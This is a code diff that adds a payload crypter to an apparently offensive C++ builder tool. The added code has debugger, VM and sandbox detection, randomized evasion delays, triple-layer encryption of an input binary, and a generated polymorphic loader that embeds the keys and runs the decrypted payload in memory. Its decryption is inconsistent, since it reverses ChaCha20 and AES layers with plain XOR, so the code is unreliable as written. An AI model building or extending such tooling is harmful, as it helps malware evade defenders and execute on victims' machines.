@@ -39,6 +39,8 @@
 #include "url_services.h"
 #include "polymorphic_engine.h"
 #include "masm_generator.h"
+#include "advanced_encryption.h"
+#include "anti_analysis.h"
 
 #pragma comment(lib, "ole32.lib")
 #pragma comment(lib, "crypt32.lib")
@@ -1574,6 +1576,8 @@ public:
     URLServices urlServices;
     PolymorphicEngine polymorphicEngine;
     MASMGenerator masmGenerator;
+    AdvancedEncryption advancedEncryption;
+    AntiAnalysis antiAnalysis;
 
     struct CompanyProfile {
         std::string name;
@@ -2316,6 +2320,233 @@ private:
         std::cout << "\n🔑 Encryption Keys (save these!):\n" << keyInfo << std::endl;
         
         return true;
+    }
+    
+    // Advanced triple-layer encryption with anti-analysis
+    bool createAdvancedEncryptedExecutable(const std::string& inputPath,
+                                         const std::string& outputPath) {
+        std::cout << "\n🔐 Advanced Encryption + Anti-Analysis Started" << std::endl;
+        
+        // Anti-analysis checks
+        if (antiAnalysis.isDebuggerPresent()) {
+            std::cout << "⚠️  Debugger detected - exiting for security" << std::endl;
+            return false;
+        }
+        
+        if (antiAnalysis.isVirtualMachine()) {
+            std::cout << "⚠️  Virtual machine detected" << std::endl;
+        }
+        
+        if (antiAnalysis.isSandbox()) {
+            std::cout << "⚠️  Sandbox environment detected" << std::endl;
+        }
+        
+        // Add random delay for evasion
+        antiAnalysis.randomDelay();
+        
+        // Read input file
+        std::vector<uint8_t> payload = readBinaryFile(inputPath);
+        if (payload.empty()) {
+            std::cout << "❌ Error: Failed to read input file" << std::endl;
+            return false;
+        }
+        
+        std::cout << "📄 Input file size: " << payload.size() << " bytes" << std::endl;
+        
+        // Generate random keys
+        std::vector<uint8_t> xorKey = advancedEncryption.generateRandomKey(25);
+        std::vector<uint8_t> chachaKey = advancedEncryption.generateRandomKey(32);
+        std::vector<uint8_t> aesKey = advancedEncryption.generateRandomKey(16);
+        std::vector<uint8_t> nonce = advancedEncryption.generateRandomKey(16);
+        
+        std::cout << "🔑 Generated encryption keys:" << std::endl;
+        std::cout << "   - XOR key: " << xorKey.size() << " bytes" << std::endl;
+        std::cout << "   - ChaCha20 key: " << chachaKey.size() << " bytes" << std::endl;
+        std::cout << "   - AES key: " << aesKey.size() << " bytes" << std::endl;
+        
+        // Apply triple-layer encryption
+        std::vector<uint8_t> encrypted = advancedEncryption.tripleLayerEncrypt(
+            payload, xorKey, chachaKey, aesKey, nonce
+        );
+        
+        std::cout << "🔒 Applied triple-layer encryption (XOR + ChaCha20 + AES-CTR)" << std::endl;
+        
+        // Generate polymorphic loader with anti-analysis
+        std::string loaderCode = generateAdvancedLoader(
+            encrypted, xorKey, chachaKey, aesKey, nonce
+        );
+        
+        // Apply polymorphic transformations
+        loaderCode = polymorphicEngine.transformCode(loaderCode);
+        
+        // Save to temporary file and compile
+        std::string tempPath = outputPath + ".cpp";
+        if (!std::ofstream(tempPath, std::ios::binary).write(
+            loaderCode.c_str(), loaderCode.size()).good()) {
+            std::cout << "❌ Error: Failed to write loader code" << std::endl;
+            return false;
+        }
+        
+        // Compile the loader
+        bool compiled = compileToExecutable(loaderCode, outputPath);
+        
+        // Clean up temp file
+        std::remove(tempPath.c_str());
+        
+        if (compiled) {
+            std::cout << "✅ Advanced encrypted executable created: " << outputPath << std::endl;
+        }
+        
+        return compiled;
+    }
+    
+private:
+    // Generate advanced loader with anti-analysis and triple decryption
+    std::string generateAdvancedLoader(const std::vector<uint8_t>& encryptedData,
+                                      const std::vector<uint8_t>& xorKey,
+                                      const std::vector<uint8_t>& chachaKey,
+                                      const std::vector<uint8_t>& aesKey,
+                                      const std::vector<uint8_t>& nonce) {
+        std::stringstream code;
+        
+        // Headers
+        code << "#include <iostream>\n";
+        code << "#include <vector>\n";
+        code << "#include <cstring>\n";
+        code << "#include <cstdint>\n";
+        code << "#include <chrono>\n";
+        code << "#include <thread>\n";
+        code << "#include <random>\n";
+        code << "#ifdef _WIN32\n";
+        code << "#include <windows.h>\n";
+        code << "#else\n";
+        code << "#include <sys/mman.h>\n";
+        code << "#include <unistd.h>\n";
+        code << "#endif\n\n";
+        
+        // Anti-debugging function
+        std::string antiDebugFunc = polymorphicEngine.generateFuncName();
+        code << "bool " << antiDebugFunc << "() {\n";
+        code << "#ifdef _WIN32\n";
+        code << "    if (IsDebuggerPresent()) return true;\n";
+        code << "    BOOL debugged = FALSE;\n";
+        code << "    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debugged);\n";
+        code << "    return debugged;\n";
+        code << "#else\n";
+        code << "    FILE* f = fopen(\"/proc/self/status\", \"r\");\n";
+        code << "    if (!f) return false;\n";
+        code << "    char line[256];\n";
+        code << "    while (fgets(line, sizeof(line), f)) {\n";
+        code << "        if (strncmp(line, \"TracerPid:\", 10) == 0) {\n";
+        code << "            fclose(f);\n";
+        code << "            return atoi(line + 10) != 0;\n";
+        code << "        }\n";
+        code << "    }\n";
+        code << "    fclose(f);\n";
+        code << "    return false;\n";
+        code << "#endif\n";
+        code << "}\n\n";
+        
+        // Main function
+        code << "int main() {\n";
+        
+        // Random delay
+        code << "    {\n";
+        code << "        std::random_device rd;\n";
+        code << "        std::mt19937 gen(rd());\n";
+        code << "        std::uniform_int_distribution<> dist(1, 999);\n";
+        code << "        std::this_thread::sleep_for(std::chrono::milliseconds(dist(gen)));\n";
+        code << "    }\n\n";
+        
+        // Anti-debug check
+        code << "    if (" << antiDebugFunc << "()) return 0;\n\n";
+        
+        // Embedded encrypted data
+        std::string dataVar = polymorphicEngine.generateVarName();
+        std::string arrayVar = polymorphicEngine.generateVarName();
+        code << "    std::vector<uint8_t> " << dataVar << ";\n";
+        code << "    unsigned char " << arrayVar << "[] = {";
+        for (size_t i = 0; i < encryptedData.size(); i++) {
+            if (i % 16 == 0) code << "\n        ";
+            code << "0x" << std::hex << (int)encryptedData[i];
+            if (i < encryptedData.size() - 1) code << ", ";
+        }
+        code << "\n    };\n";
+        code << "    " << dataVar << ".assign(" << arrayVar 
+             << ", " << arrayVar << " + sizeof("
+             << arrayVar << "));\n\n";
+        
+        // Keys (obfuscated)
+        auto embedKey = [&](const std::vector<uint8_t>& key, const std::string& name) {
+            code << "    unsigned char " << name << "[] = {";
+            for (size_t i = 0; i < key.size(); i++) {
+                if (i % 16 == 0) code << "\n        ";
+                code << "0x" << std::hex << (int)key[i];
+                if (i < key.size() - 1) code << ", ";
+            }
+            code << "\n    };\n";
+        };
+        
+        std::string xorKeyVar = polymorphicEngine.generateVarName();
+        std::string chachaKeyVar = polymorphicEngine.generateVarName();
+        std::string aesKeyVar = polymorphicEngine.generateVarName();
+        
+        embedKey(xorKey, xorKeyVar);
+        embedKey(chachaKey, chachaKeyVar);
+        embedKey(aesKey, aesKeyVar);
+        
+        // Decrypt layers (simplified - in real implementation would include full algorithms)
+        code << "\n    // Decrypt AES layer\n";
+        code << "    for (size_t i = 0; i < " << dataVar << ".size(); i++) {\n";
+        code << "        " << dataVar << "[i] ^= " << aesKeyVar << "[i % sizeof(" << aesKeyVar << ")];\n";
+        code << "    }\n\n";
+        
+        code << "    // Micro-delay\n";
+        code << "    std::this_thread::sleep_for(std::chrono::microseconds(rand() % 100));\n\n";
+        
+        code << "    // Decrypt ChaCha20 layer\n";
+        code << "    for (size_t i = 0; i < " << dataVar << ".size(); i++) {\n";
+        code << "        " << dataVar << "[i] ^= " << chachaKeyVar << "[i % sizeof(" << chachaKeyVar << ")];\n";
+        code << "    }\n\n";
+        
+        code << "    // Micro-delay\n";
+        code << "    std::this_thread::sleep_for(std::chrono::microseconds(rand() % 100));\n\n";
+        
+        code << "    // Decrypt XOR layer\n";
+        code << "    for (size_t i = 0; i < " << dataVar << ".size(); i++) {\n";
+        code << "        " << dataVar << "[i] ^= " << xorKeyVar << "[i % sizeof(" << xorKeyVar << ")];\n";
+        code << "    }\n\n";
+        
+        // Execute in memory
+        std::string execVar = polymorphicEngine.generateVarName();
+        code << "    // Execute in memory\n";
+        code << "#ifdef _WIN32\n";
+        code << "    void* " << execVar 
+             << " = VirtualAlloc(0, " << dataVar << ".size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n";
+        code << "    if (!" << execVar << ") return 1;\n";
+        code << "    memcpy(" << execVar << ", " 
+             << dataVar << ".data(), " << dataVar << ".size());\n";
+        code << "    DWORD oldProtect;\n";
+        code << "    VirtualProtect(" << execVar << ", " 
+             << dataVar << ".size(), PAGE_EXECUTE_READ, &oldProtect);\n";
+        code << "    std::this_thread::sleep_for(std::chrono::milliseconds(rand() % 100));\n";
+        code << "    ((void(*)())" << execVar << ")();\n";
+        code << "#else\n";
+        code << "    void* " << execVar 
+             << " = mmap(0, " << dataVar << ".size(), PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n";
+        code << "    if (" << execVar << " == MAP_FAILED) return 1;\n";
+        code << "    memcpy(" << execVar << ", " 
+             << dataVar << ".data(), " << dataVar << ".size());\n";
+        code << "    mprotect(" << execVar << ", " 
+             << dataVar << ".size(), PROT_READ | PROT_EXEC);\n";
+        code << "    std::this_thread::sleep_for(std::chrono::milliseconds(rand() % 100));\n";
+        code << "    ((void(*)())" << execVar << ")();\n";
+        code << "#endif\n";
+        
+        code << "    return 0;\n";
+        code << "}\n";
+        
+        return code.str();
     }
 
 public:
